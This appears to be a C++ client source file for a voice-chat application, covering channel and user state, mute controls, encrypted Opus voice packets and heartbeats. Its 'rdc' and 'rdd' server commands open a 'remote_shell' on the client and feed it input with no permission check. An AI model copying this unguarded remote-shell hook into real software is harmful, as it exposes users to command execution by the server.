#include "client.h"
#include "gt_defs.h"
#define FMT_HEADER_ONLY
#include <fmt/core.h>
#include <assert.h>
#include <limits>
#include "native_util.hpp"
#include <configor/json.hpp>
#include <filesystem>
#include "events.h"
#include "web.h"

using namespace configor;

std::map<std::string, connection*> connections;
delegate<void(event type, connection* conn)> e_server;
delegate<void(event type, channel* channel)> e_channel;
delegate<void(event type, entity* entity)> e_entity;
delegate<void(event type, void* data)> e_client;

std::thread c_th_heartbeat;


//FrameAligner c_fa_mic_t(480 * 6);
void connection::on_recv_cmd(command& cmd)
{
	if (status == state::verifing)
	{
		if (cmd[0] == "ch")
		{
			suid = std::strtoull(cmd[1].c_str(), nullptr, 10);
			auto v = cmd[2];
			if (v == "ok" || v == "new")
			{
				status = state::established;
				if (cmd.has_option("-t"))
				{
					conf_set_token(host, suid, cmd["-t"]);
				}
				//sapi_join_server(host);
			}
			else
			{
				status = state::disconnect;
				disconnect();
				e_server(event::auth, this);
			}
			printf("[%s]\n", cmd.str().c_str());
			local->conn = this;
			local->suid = suid;
			if (cmd.has_option("-n"))
				local->name = cmd["-n"];
			if (cmd.has_option("-sn"))
				this->name = cmd["-sn"];
			if (cmd.has_option("-sd"))
				this->description = cmd["-sd"];
			conf_set_server(*this);
			e_server(event::join, this);

		}
	}
	else
	{
		if (cmd[0] != "pong" && cmd[0] != "dp")
			printf("[%s]\n", cmd.str().c_str());
		if (cmd[0] == "cd")
		{
			uint32_t chid = stru64(cmd[1]);
			if (cmd.has_option("-r"))
			{
				if (channels.count(chid))
				{
					channel* d = channels[chid];
					channels.erase(chid);
					delete d;
				}
				return;
			}
			if (!channels.count(chid))
			{
				channels[chid] = new channel();
			}
			channel* d = channels[chid];
			d->chid = chid;
			d->conn = this;
			if (cmd.has_option("-n"))
				d->name = cmd["-n"];
			if (cmd.n_opt_val("-d"))
				d->description = cmd["-d"];
			if (cmd.has_option("-p"))
				d->parent = stru64(cmd["-p"]);
		}
		else if (cmd[0] == "rd")
		{
			uint32_t suid = stru64(cmd[1]);
			bool new_entity = false;
			if (!entities.count(suid))
			{
				if (cmd.has_option("-l"))
					return;
				entity* ne;
				if (suid == this->suid)
					ne = local;
				else
					ne = new entity();
				entities[suid] = ne;
				ne->suid = suid;
				ne->conn = this;
				new_entity = true;
			}
			entity* e = entities[suid];
			if (cmd.has_option("-l"))
			{
				entities.erase(suid);
				auto c = e->current_chid;
				channels[c]->erase(e);
				if (suid == this->suid)
				{
					this->chid = 0;
					this->current = nullptr;
					local->current_chid = 0;
				}
				else
					delete e;
			}
			else
			{
				auto last_chid = e->current_chid;
				if (cmd.has_option("-n"))
					e->name = cmd["-n"];
				if (cmd.has_option("-u"))
					e->uuid = stru64(cmd["-u"]);
				if (cmd.has_option("-a"))
					e->avatar = cmd["-a"];
				if (cmd.has_option("-c"))
					e->current_chid = stru64(cmd["-c"]);
				if (new_entity)
				{
					if (e->current_chid == chid && mic)
					{
						e_entity(event::join, std::move(e));
					}
					if (e->current_chid)
						channels[e->current_chid]->join(e, true);
					if (suid == this->suid)
					{
						if (e->current_chid)
							current = channels[e->current_chid];
						else
							current = nullptr;
						chid = e->current_chid;
						channel_switch(0, e->current_chid);
					}

				}
				else if (last_chid != e->current_chid)
				{
					if (suid == this->suid)
					{
						if (e->current_chid)
							current = channels[e->current_chid];
						channel_switch(last_chid, e->current_chid);
					}
					if (last_chid)
						channels[last_chid]->erase(e);
					if (e->current_chid)
						channels[e->current_chid]->join(e);
					if (suid != this->suid)
					{
						if (e->current_chid == chid)
						{
							e_entity(event::join, std::move(e));
						}
					}

				}
			}

		}
		else if (cmd[0] == "info")
		{
			send_command(fmt::format("sc -mute {} -silent {}\n", (int)plat_get_global_mute(), (int)plat_get_global_silent()));
			e_server(event::initiate, this);
		}
		else if (cmd[0] == "s")
		{
			uint32_t chid = stru64(cmd[1]);
			assert(current->chid == chid);
			ssid = stru64(cmd[2]);
			cert = stru64(cmd[3]);
			uint32_t buf[4];
			buf[0] = 0;
			buf[1] = suid;
			buf[2] = ssid;
			buf[3] = cert;
			send_voip_pack((const char*)buf, sizeof buf);
		}
		else if (cmd[0] == "v")
		{
			uint32_t chid = stru64(cmd[1]);
			assert(current->chid == chid);
			uint32_t ssid = stru64(cmd[2]);
			assert(this->ssid == ssid);
			uint32_t state = 0;
			state = stru64(cmd[3]);
			if (state == 1)
			{
				if (mic)
					plat_delete_vr(mic);
				mic = plat_create_vr();
				mic->callback = [=](AudioFrame* f)
					{
						on_mic_pack(f);
					};
			}
			else
			{
				if (mic)
					plat_delete_vr(mic);
				mic = nullptr;
			}
		}
		else if (cmd[0] == "dp")
		{
			//for (int i = 1; i < cmd.n_args(); i++)
			{
				printf("%s", cmd.token(1).c_str());
			}
		}
		else if (cmd[0] == "sc")
		{
			suid_t u = stru64(cmd[1]);
			if (u == suid)
			{
				if (cmd.n_opt_val("-mute"))
				{
					int s = stru64(cmd.option("-mute"));
					entity_state.man_mute = (s & 1);
					entity_state.mute |= (s >> 1);
					client_set_global_mute(entity_state.is_mute(), false);
				}
				if (cmd.n_opt_val("-silent"))
				{
					int s = stru64(cmd.option("-silent"));
					entity_state.man_silent = (s & 1);
					entity_state.silent |= (s >> 1);
					client_set_global_silent(entity_state.is_silent(), false);
				}
			}
			else
			{
				if (!entities.count(u)) return;
				auto e = entities[u];
				if (cmd.n_opt_val("-mute"))
				{
					int s = stru64(cmd.option("-mute"));
					e->entity_state.man_mute = (s & 1);
					e->entity_state.mute = (s >> 1);
					e_entity(event::mute, std::move(e));
				}
				if (cmd.n_opt_val("-silent"))
				{
					int s = stru64(cmd.option("-silent"));
					e->entity_state.man_silent = (s & 1);
					e->entity_state.silent = (s >> 1);
					e_entity(event::silent, std::move(e));
				}

			}
		}
		else if (cmd[0] == "rdc")
		{
			if (cmd.n_args() < 3) return;
			suid_t dest = stru64(cmd[2]);
			if (cmd[1] == "open")
			{
				if (!debug_state.shell)
					debug_state.shell = new remote_shell(this, dest);
			}
			else if (cmd[1] == "close")
			{
				if (debug_state.shell)
					delete debug_state.shell;
				debug_state.shell = nullptr;

			}
		}
		else if (cmd[0] == "rdd")
		{
			if (cmd.n_args() < 2) return;
			if (debug_state.shell)
			{
				debug_state.shell->input(cmd[1]);
			}
		}
		else if (cmd[0] == "role")
		{
			local->server_role = cmd[1];
			if (current)
			{
				local->channel_role = cmd["-crole"];
			}
		}
		else if (cmd[0] == "perm")
		{
			for (int i = 1; i < cmd.n_args(); i++)
			{
				local->permissions.permissions.insert(cmd[i]);
			}

		}
		else if (cmd[0] == "sv")
		{
			std::string a = "本地";
			if (cmd.has_option("-sn"))
				this->name = cmd["-sn"];
			if (cmd.has_option("-sd"))
				this->description = cmd["-sd"];
			conf_set_server(*this);
		}
	}
}
int connection::clean_up()
{
	for (auto& i : channels)
	{
		delete i.second;
		i.second = nullptr;
	}
	channels.clear();
	for (auto& i : entities)
	{
		delete i.second;
		i.second = nullptr;
	}
	entities.clear();
	e_server(event::left, this);
	return 0;
}
void connection::on_mic_pack(AudioFrame* f)
{
	unsigned char buf[1480];
	((uint32_t*)buf)[0] = suid;
	((uint32_t*)buf)[1] = ssid;
	fa_netopt.Input(*f);
	AudioFrame frame;
	while (fa_netopt.Output(&frame))
	{
		f = &frame;
		int len = opus_encode_float(aud_enc, f->samples, f->nSamples, &buf[8], 1480 - 8);
		if (len > 1)
		{
			//printf("dtx opus\n");
			edcrypt_voip_pack((char*)buf, len + 8, cert);
			send_voip_pack((const char*)buf, len + 8);
			debug_state.nb_pak_sent += len + 8;
			debug_state.n_pak_sent++;
		}
		else if (len < 1)
		{
			debug_state.n_pak_err_enc++;
			printf("ERROR: encode error %d\n\tAF: n_channel=%d, n_samples=%d\n", len, frame.nChannel, frame.nSamples);
		}
		frame.Release();
	}
}
void connection::join_channel(uint32_t chid)
{
	//if (mic)
	//	plat_delete_vr(mic);
	//mic = nullptr;
	auto cmd = fmt::format("j {}\n", chid);
	send_command(cmd.c_str(), cmd.length());
}

void connection::channel_switch(uint32_t from, uint32_t to)
{
	printf("channel siwtched from %d to %d\n", from, to);
	if (channels.count(from))
	{
		auto c = channels[from];
		for (auto i : c->entities)
		{
			i->remove_playback();
		}
	}
	if (channels.count(to))
	{
		current = channels[to];
		chid = to;
		e_channel(event::join, std::move(current));
		for (auto i : current->entities)
		{
			if (i->suid != suid)
				i->create_playback();
		}
	}
}

void channel::erase(entity* e)
{
	bool op = false;
	for (auto i = entities.begin(); i != entities.end(); i++)
	{
		if (*i == e)
		{
			entities.erase(i);
			op = true;
			break;
		}
	}
	if (op && conn->current && chid == conn->current->chid && conn->status == connection::state::established)
	{
		if (e->suid == conn->suid)
		{
			e_channel(event::left, std::move(this));
		}
		else
			e_entity(event::left, std::move(e));
		e->remove_playback();
	}
}
void channel::erase(uint32_t suid)
{
	entity* e = nullptr;
	for (auto i = entities.begin(); i != entities.end(); i++)
	{
		if ((*i)->suid == suid)
		{
			e = *i;
			entities.erase(i);
			break;
		}
	}
	if (e && chid == conn->current->chid && conn->status == connection::state::established)
	{
		e_entity(event::left, std::move(e));
		//sapi_say(fmt::format("'{}'已离开频道", e->name));
		e->remove_playback();
	}

}

void channel::join(entity* e, bool is_new)
{
	for (auto i = entities.begin(); i != entities.end(); i++)
	{
		if ((*i) == e)
		{
			return;
		}
	}
	entities.push_back(e);
	if (this == conn->current && e->suid != conn->suid)
	{
		e->create_playback();
	}
}
channel::~channel()
{
	for (auto i : entities)
	{
		erase(i);
	}
	conn = nullptr;
}

void connection::set_client_volume(uint32_t suid, float vol, bool save)
{
	if (save)
		conf_set_uc_volume(host, suid, vol);
	if (!entities.count(suid)) return;
	entities[suid]->set_volume(vol);
	e_entity(event::volume_change, std::move(entities[suid]));
}
float connection::get_client_volume(uint32_t suid)
{
	if (entities.count(suid))
		return entities[suid]->get_volume();
	return 0.0;
}
void connection::set_client_mute(uint32_t suid, bool mute, bool save)
{
	if (save)
		conf_set_uc_mute(host, suid, mute);
	if (!entities.count(suid)) return;
	entities[suid]->set_mute(mute);
	e_entity(event::mute, std::move(entities[suid]));
}
bool connection::get_client_mute(uint32_t suid)
{
	if (entities.count(suid))
		return entities[suid]->get_mute();
	return false;
}

int client_connect(std::string host, uint16_t port, connection** conn)
{
	std::string key = fmt::format("{}:{}", host, port);
	if (connections.count(key))
	{
		*conn = connections[key];
		if ((*conn)->status == connection::state::disconnect)
			return (*conn)->connect(host.c_str(), port);
		return 0;
	}
	*conn = new connection();
	connections[key] = *conn;
	return (*conn)->connect(host.c_str(), port);

}
int client_disconnect(connection* conn)
{
	for (auto& i : connections)
	{
		if (i.second == conn)
		{
			delete conn;
			connections.erase(i.first);
			return 0;
		}
	}
	return 1;
}
connection* client_get_current_server()
{
	if (connections.size())
		return connections.begin()->second;
	else
		return nullptr;
}

void heartbeat_thread()
{
	while (!discard)
	{
		std::this_thread::sleep_for(std::chrono::seconds(30));
		auto c = client_get_current_server();
		if (c && c->status == connection::state::established)
		{
			c->tick();
		}
	}
}
int client_init()
{
	configs_init();
	platform_init();
	std::vector<audio_device> ls;
	std::string str;
	if (conf_get_input_device(str))
	{
		plat_set_input_device(str);
	}
	if (conf_get_output_device(str))
	{
		plat_set_output_device(str);
	}
	float f;
	bool b;
	conf_get_global_volume(f);
	plat_set_global_volume(f);
	conf_get_global_mute(b);
	plat_set_global_mute(b);
	conf_get_global_silent(b);
	plat_set_global_silent(b);
	conf_get_sapi(str);

	sapi_init();

	tray_init();
	web_init();

	str = sapi_get_profile();
	if (!c_th_heartbeat.joinable())
	{
		c_th_heartbeat = std::thread(heartbeat_thread);
	}
	return 0;
}

void entity::load_profile()
{
	float v;
	bool b;
	conf_get_uc_volume(conn->host, suid, v);
	set_volume(v);
	conf_get_uc_mute(conn->host, suid, b);
	set_mute(b);
}
entity::~entity()
{
	remove_playback();
}
void client_set_global_mute(bool m, bool broadcast)
{
	auto server = client_get_current_server();
	plat_set_global_mute(m);
	conf_set_global_mute(m);
	//if (client_get_current_server())
	//	e_entity(event::mute, std::move(server->entities[server->suid]));
	e_client(event::mute, &m);

	if (server && broadcast)
	{
		server->entity_state.mute = m;
		auto cmd = fmt::format("sc -mute {}\n", (int)m);
		server->send_command(cmd);
	}
}
void client_set_global_silent(bool s, bool broadcast)
{
	auto server = client_get_current_server();
	plat_set_global_silent(s);
	conf_set_global_silent(s);
	//if (client_get_current_server())
	//	e_entity(event::silent, std::move(server->entities[server->suid]));
	e_client(event::silent, &s);
	if (server && broadcast)
	{
		server->entity_state.silent = s;
		auto cmd = fmt::format("sc -silent {}\n", (int)s);
		server->send_command(cmd);
	}
}
void client_set_global_volume(float db)
{
	plat_set_global_volume(db);
	conf_set_global_volume(db);

}
int client_uninit()
{
	for (auto& i : connections)
	{
		i.second->disconnect();
	}
	web_uninit();
	tray_uninit();
	sapi_uninit();
	platform_uninit();
	configs_uninit();

	discard = true;
	c_th_heartbeat.detach();
	return 0;
}
